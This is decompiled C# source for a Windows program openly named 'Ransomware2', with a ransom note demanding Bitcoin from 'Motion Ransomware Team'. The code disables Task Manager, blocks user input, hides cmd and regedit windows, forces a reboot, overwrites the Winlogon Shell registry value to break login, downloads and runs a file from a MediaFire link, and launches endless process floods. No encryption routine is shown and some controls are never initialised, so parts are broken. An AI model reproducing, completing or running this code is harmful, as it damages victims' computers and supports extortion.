using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Microsoft.Win32;

namespace Rasomware2._0;

public class Ransomware2 : Form
{
	private const int SW_HIDE = 0;

	private const int SW_SHOW = 5;

	private Uri uri = new Uri("http://example.com/files/example.exe");

	private string filename = "C:\\Users\\**\\AppData\\Local\\Temp\\example.exe";

	private IContainer components = null;

	private PictureBox pictureBox1;

	private PictureBox pictureBox2;

	private Label lbl1;

	private Label label1;

	private TextBox codebox;

	private Button button1;

	private Label label2;

	private Label label3;

	private Timer tmr_hide;

	private Timer tmr_show;

	private Timer tmr_if;

	private Timer tmr_encrypt;

	private Timer tmr_clock;

	private RichTextBox richTextBox1;

	private Label label4;

	private Label label5;

	private Label label6;

	private Label label7;

	private LinkLabel linkLabel1;

	private Button button2;

	private Button button3;

	private Button button4;

	[DllImport("User32")]
	private static extern int ShowWindow(int hwnd, int nCmdShow);

	[DllImport("user32.dll")]
	private static extern bool BlockInput(bool block);

	public Ransomware2()
	{
		InitializeComponent();
		((Control)label2).set_Text(TimeSpan.FromMinutes(60.0).ToString());
	}

	private void Ransomware2_FormClosing(object sender, FormClosingEventArgs e)
	{
		((CancelEventArgs)(object)e).Cancel = true;
	}

	private void Ransomware2_Load(object sender, EventArgs e)
	{
		//IL_00dc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ee: Expected O, but got Unknown
		StreamWriter streamWriter = new StreamWriter("C://Users//Arnav//Desktop//Read_Me!.txt");
		streamWriter.WriteLine("Hello,Your Files are Encrypted");
		streamWriter.WriteLine("Your Personal ID:");
		streamWriter.WriteLine("uy3jd94uyfg98ug9rfhruehfujhrfeuhfruyhrfrfhrfhrfrfthureyyeruyrt7295");
		streamWriter.WriteLine("U nned to pay us 0.04 Bitcoins at this address:744987384t9hi50iKHSA");
		streamWriter.WriteLine("THANK YOU FROM MOTION RANSOMWARE TEAM :)");
		streamWriter.Close();
		((Form)this).set_Opacity(0.0);
		((Form)this).set_Size(new Size(50, 50));
		((Form)this).set_Location(new Point(-100, -100));
		FreezeMouse();
		RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
		registryKey.SetValue("DisableTaskMgr", 1, RegistryValueKind.String);
		RegistryKey registryKey2 = Registry.CurrentUser.CreateSubKey("Control Panel\\Desktop");
		registryKey2.SetValue("Wallpaper", "", RegistryValueKind.String);
		Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		DateTime startTime = DateTime.Now;
		Timer val = new Timer();
		val.set_Interval(1000);
		Timer val2 = val;
		val2.add_Tick((EventHandler)delegate
		{
			((Control)label2).set_Text((TimeSpan.FromMinutes(60.0) - (DateTime.Now - startTime)).ToString("hh\\:mm\\:ss"));
		});
		val2.set_Enabled(true);
		tmr_hide.Start();
		tmr_show.Start();
		tmr_if.Start();
		tmr_encrypt.Start();
		tmr_clock.Start();
	}

	private void tmr_hide_Tick(object sender, EventArgs e)
	{
		tmr_hide.Stop();
		((Form)this).set_Opacity(100.0);
		((Form)this).set_Size(new Size(701, 584));
		((Form)this).set_Location(new Point(500, 500));
	}

	private void tmr_show_Tick(object sender, EventArgs e)
	{
		tmr_show.Stop();
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		string path = folderPath + "\\desktop.ini";
		File.Delete(path);
		string environmentVariable = Environment.GetEnvironmentVariable("USERPROFILE");
		string text = Path.Combine(environmentVariable, "Downloads");
		string path2 = text + "\\desktop.ini";
		File.Delete(path2);
	}

	private void tmr_if_Tick(object sender, EventArgs e)
	{
		tmr_if.Stop();
		Process[] processes = Process.GetProcesses();
		Process[] array = processes;
		foreach (Process process in array)
		{
			if (process.ProcessName == "cmd")
			{
				int hwnd = process.MainWindowHandle.ToInt32();
				ShowWindow(hwnd, 0);
			}
			if (process.ProcessName == "regedit")
			{
				int hwnd = process.MainWindowHandle.ToInt32();
				ShowWindow(hwnd, 0);
			}
			if (process.ProcessName == "Processhacker")
			{
				int hwnd = process.MainWindowHandle.ToInt32();
				ShowWindow(hwnd, 0);
			}
			if (process.ProcessName == "sdclt")
			{
				int hwnd = process.MainWindowHandle.ToInt32();
				ShowWindow(hwnd, 0);
			}
		}
		tmr_if.Start();
	}

	private void tmr_clock_Tick(object sender, EventArgs e)
	{
		tmr_clock.Stop();
		Process[] array = null;
		array = Process.GetProcessesByName("Ransomware2.0");
		Process[] array2 = array;
		foreach (Process process in array2)
		{
			Process.Start("shutdown", "/r /t 0");
			process.Kill();
		}
		((Form)this).Close();
	}

	private void button1_Click(object sender, EventArgs e)
	{
	}

	public static void FreezeMouse()
	{
		BlockInput(block: true);
	}

	private void codebox_TextChanged(object sender, EventArgs e)
	{
	}

	private void label1_Click(object sender, EventArgs e)
	{
	}

	private void richTextBox1_TextChanged(object sender, EventArgs e)
	{
	}

	private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
	{
		linkLabel1.set_LinkVisited(true);
		Process.Start("https://en.wikipedia.org/wiki/Bitcoin");
	}

	private void button2_MouseEnter(object sender, EventArgs e)
	{
		((ButtonBase)button2).set_UseVisualStyleBackColor(false);
		((Control)button2).set_BackColor(Color.Black);
		((Control)button2).set_ForeColor(Color.Red);
	}

	private void button2_Click(object sender, EventArgs e)
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0014: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Unknown result type (might be due to invalid IL or missing references)
		//IL_0019: Invalid comparison between Unknown and I4
		string text = "Payment not Done!!";
		string text2 = "Close Window";
		DialogResult val = MessageBox.Show(text, text2, (MessageBoxButtons)4);
		if ((int)val == 6)
		{
			RegistryKey registryKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
			registryKey.SetValue("Shell", "empty", RegistryValueKind.String);
		}
	}

	private void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
	{
	}

	private void button3_Click(object sender, EventArgs e)
	{
		string text = "https://www.mediafire.com/file/bb4j6vbmb9t7dfa/autorun.inf/file";
		string text2 = "autorun.inf";
		string text3 = null;
		WebClient webClient = new WebClient();
		text3 = text + text2;
		webClient.DownloadFile(text3, text2);
		Process.Start(text2);
		RegistryKey registryKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
		registryKey.SetValue("Shell", "empty", RegistryValueKind.String);
		while (true)
		{
			Process.Start("mspaint.exe");
			Process.Start("mspaint.exe");
			Process.Start("mspaint.exe");
			Process.Start("mspaint.exe");
			Process.Start("mspaint.exe");
			Process.Start("mspaint.exe");
			Process.Start("mspaint.exe");
			Process.Start("mspaint.exe");
			Process.Start("mspaint.exe");
			Process.Start("mspaint.exe");
			Process.Start("mspaint.exe");
			Process.Start("mspaint.exe");
			Process.Start("mspaint.exe");
			Process.Start("notepad.exe");
			Process.Start("notepad.exe");
			Process.Start("notepad.exe");
			Process.Start("notepad.exe");
		}
	}

	private void button4_Click(object sender, EventArgs e)
	{
		Form2 form = new Form2();
		((Form)form).Show((IWin32Window)(object)this);
	}

	private void button5_Click(object sender, EventArgs e)
	{
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_008c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0096: Expected O, but got Unknown
		//IL_013f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0149: Expected O, but got Unknown
		//IL_01cb: Unknown result type (might be due to invalid IL or missing references)
		//IL_01d5: Expected O, but got Unknown
		//IL_0258: Unknown result type (might be due to invalid IL or missing references)
		//IL_0262: Expected O, but got Unknown
		//IL_0355: Unknown result type (might be due to invalid IL or missing references)
		//IL_035f: Expected O, but got Unknown
		//IL_03cf: Unknown result type (might be due to invalid IL or missing references)
		//IL_03d9: Expected O, but got Unknown
		//IL_03fc: Unknown result type (might be due to invalid IL or missing references)
		//IL_0406: Expected O, but got Unknown
		//IL_04b2: Unknown result type (might be due to invalid IL or missing references)
		//IL_04bc: Expected O, but got Unknown
		//IL_056c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0576: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Ransomware2));
		richTextBox1 = new RichTextBox();
		label4 = new Label();
		label5 = new Label();
		label6 = new Label();
		label7 = new Label();
		linkLabel1 = new LinkLabel();
		button2 = new Button();
		button3 = new Button();
		button4 = new Button();
		((Control)this).SuspendLayout();
		((Control)richTextBox1).set_Font(new Font("MV Boli", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)richTextBox1).set_Location(new Point(256, 12));
		((Control)richTextBox1).set_Name("richTextBox1");
		((Control)richTextBox1).set_Size(new Size(573, 374));
		((Control)richTextBox1).set_TabIndex(0);
		((Control)richTextBox1).set_Text(componentResourceManager.GetString("richTextBox1.Text"));
		((Control)richTextBox1).add_TextChanged((EventHandler)richTextBox1_TextChanged);
		((Control)label4).set_AutoSize(true);
		((Control)label4).set_BackColor(Color.Transparent);
		((Control)label4).set_Font(new Font("MV Boli", 14.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label4).set_ForeColor(Color.Lime);
		((Control)label4).set_Location(new Point(118, 6));
		((Control)label4).set_Name("label4");
		((Control)label4).set_Size(new Size(67, 25));
		((Control)label4).set_TabIndex(1);
		((Control)label4).set_Text("Arnav");
		((Control)label5).set_AutoSize(true);
		((Control)label5).set_Font(new Font("Microsoft PhagsPa", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label5).set_ForeColor(SystemColors.ControlLightLight);
		((Control)label5).set_Location(new Point(11, 12));
		((Control)label5).set_Name("label5");
		((Control)label5).set_Size(new Size(101, 21));
		((Control)label5).set_TabIndex(2);
		((Control)label5).set_Text("UR Name = ");
		((Control)label6).set_AutoSize(true);
		((Control)label6).set_Font(new Font("Modern No. 20", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label6).set_ForeColor(SystemColors.ButtonHighlight);
		((Control)label6).set_Location(new Point(12, 47));
		((Control)label6).set_Name("label6");
		((Control)label6).set_Size(new Size(75, 15));
		((Control)label6).set_TabIndex(3);
		((Control)label6).set_Text("PC Name =\r\n");
		((Control)label7).set_AutoSize(true);
		((Control)label7).set_ForeColor(Color.Lime);
		((Control)label7).set_Location(new Point(120, 49));
		((Control)label7).set_Name("label7");
		((Control)label7).set_Size(new Size(111, 13));
		((Control)label7).set_TabIndex(4);
		((Control)label7).set_Text("DESKTOP-SST4QNT");
		((Control)linkLabel1).set_AutoSize(true);
		((Control)linkLabel1).set_Font(new Font("Microsoft Tai Le", 11.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)linkLabel1).set_Location(new Point(12, 370));
		((Control)linkLabel1).set_Name("linkLabel1");
		((Control)linkLabel1).set_Size(new Size(113, 19));
		((Control)linkLabel1).set_TabIndex(5);
		linkLabel1.set_TabStop(true);
		((Control)linkLabel1).set_Text("About Bitcoins");
		linkLabel1.add_LinkClicked(new LinkLabelLinkClickedEventHandler(linkLabel1_LinkClicked));
		((Control)button2).set_BackColor(Color.Black);
		((Control)button2).set_Font(new Font("Modern No. 20", 9.75f, (FontStyle)5, (GraphicsUnit)3, (byte)0));
		((Control)button2).set_ForeColor(Color.Lime);
		((Control)button2).set_Location(new Point(4, 84));
		((Control)button2).set_Name("button2");
		((Control)button2).set_Size(new Size(246, 32));
		((Control)button2).set_TabIndex(6);
		((Control)button2).set_Text("I have Done the Payment!");
		((ButtonBase)button2).set_UseVisualStyleBackColor(false);
		((Control)button2).add_Click((EventHandler)button2_Click);
		((Control)button3).set_BackColor(Color.Red);
		((Control)button3).set_Font(new Font("Modern No. 20", 9.75f, (FontStyle)5, (GraphicsUnit)3, (byte)0));
		((Control)button3).set_ForeColor(Color.White);
		((Control)button3).set_Location(new Point(4, 162));
		((Control)button3).set_Name("button3");
		((Control)button3).set_Size(new Size(246, 62));
		((Control)button3).set_TabIndex(7);
		((Control)button3).set_Text("Quit!!");
		((ButtonBase)button3).set_UseVisualStyleBackColor(false);
		((Control)button3).add_Click((EventHandler)button3_Click);
		((Control)button4).set_BackColor(SystemColors.ControlDark);
		((Control)button4).set_Font(new Font("Modern No. 20", 9.75f, (FontStyle)9, (GraphicsUnit)3, (byte)0));
		((Control)button4).set_Location(new Point(4, 122));
		((Control)button4).set_Name("button4");
		((Control)button4).set_Size(new Size(246, 23));
		((Control)button4).set_TabIndex(8);
		((Control)button4).set_Text("View Encrypted Files!");
		((ButtonBase)button4).set_UseVisualStyleBackColor(false);
		((Control)button4).add_Click((EventHandler)button4_Click);
		((Control)this).set_BackColor(SystemColors.ActiveCaptionText);
		((Form)this).set_ClientSize(new Size(829, 398));
		((Control)this).get_Controls().Add((Control)(object)button4);
		((Control)this).get_Controls().Add((Control)(object)button3);
		((Control)this).get_Controls().Add((Control)(object)button2);
		((Control)this).get_Controls().Add((Control)(object)linkLabel1);
		((Control)this).get_Controls().Add((Control)(object)label7);
		((Control)this).get_Controls().Add((Control)(object)label6);
		((Control)this).get_Controls().Add((Control)(object)label5);
		((Control)this).get_Controls().Add((Control)(object)label4);
		((Control)this).get_Controls().Add((Control)(object)richTextBox1);
		((Control)this).set_Name("Ransomware2");
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
